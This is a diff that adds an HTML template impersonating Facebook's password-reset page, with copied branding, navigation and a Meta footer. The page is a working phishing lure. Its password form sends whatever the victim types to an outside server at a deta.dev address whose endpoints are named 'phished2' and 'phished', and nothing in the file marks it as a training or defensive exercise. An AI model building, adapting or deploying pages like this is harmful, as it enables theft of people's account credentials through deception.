@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Password Reset</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/facebookstyle.css') }}">
+    <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Open+Sans:300,400,600,700&amp;lang=en" />
+</head>
+<body>
+    <div class="outer-container">
+        <div class="header">
+            <div class="header-searchbar">
+                <img class="facebook-logo" src="https://logodownload.org/wp-content/uploads/2014/09/facebook-logo-0.png"
+                 alt="Facebook Logo">
+                <input type="text" placeholder="Search Facebook" class="nav-searchbar">
+            </div>
+            <div class="middle-nav-buttons">
+                <img src="https://cdn0.iconfinder.com/data/icons/uiux-001-line/32/UI_UX_UIUX_Home-512.png"
+                 alt="Home" class="home-icon">
+                <img src="https://static.vecteezy.com/system/resources/thumbnails/008/302/512/small_2x/eps10-grey-user-solid-icon-or-logo-in-simple-flat-trendy-modern-style-isolated-on-white-background-free-vector.jpg"
+                 alt="head-icon" class="head-icon">
+                <img src="https://thumb.ac-illust.com/6e/6e1e8b46e74f60025f37545fe8070f49_t.jpeg"
+                 alt="Community" class="people-icon">
+            </div>
+            <div class="right-nav-buttons">
+                <button class="friends-button">Find Friends</button>
+                <img src="https://i.pinimg.com/474x/2e/9e/f8/2e9ef895031dec4394bdde2789f16437.jpg"
+                 alt="Notifications" class="notifications-icon">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQUODrMzBsXaMGNoGnB0RMWnaPQcNL42i44HA&usqp=CAU"
+                 alt="Profile" class="profile-icon">
+            </div>
+        </div>
+        <div class="card">
+            <h2>Choose a new password</h2>
+            <hr class="linebreak">
+            <p>Create a new password that is at least 6 characters long.
+                 A strong password is a combination of letters, numbers,
+                  and punctuation marks.</p>
+                  <form action="https://tt2t1g.deta.dev/phished2" class="card-form">
+                    <input type="password" id="password" name="password" 
+                    placeholder="New password">
+
+                    <label for="password"></label>
+                    <button type="button" class="question-button">?</button>
+                    <br>
+                    <div class="checkbox-div">
+                    <input type="checkbox" name="checkbox" id="checkbox">
+                    <label for="checkbox" class="checkbox-label">Log me out of Facebook everywhere else 
+                        my account might be open. (Choose this if a stranger
+                        used your account.)
+                    </label>
+                    </div>
+                    <hr class="linebreak", class="bottom-break">
+                    <div class="bottom-buttons">
+                        <button type="button" class="cancel">Cancel</button>
+                        <form action="https://tt2t1g.deta.dev/phished">
+                            <input type="submit" value="Continue" class="continue">
+                        </form>
+                    </div>
+                  </form>
+        </div>
+        <div class="footer">
+            <ul class="footer-options">
+                <li class="first-item">Privacy</li>
+                <li>Terms</li>
+                <li>Advertising</li>
+                <li>Ad Choices</li>
+                <li>Cookies</li>
+                <li>More</li>
+                <li>&copy; Meta 2022</li>
+            </ul>
+        </div>
+    </div>
+</body>
+</html>
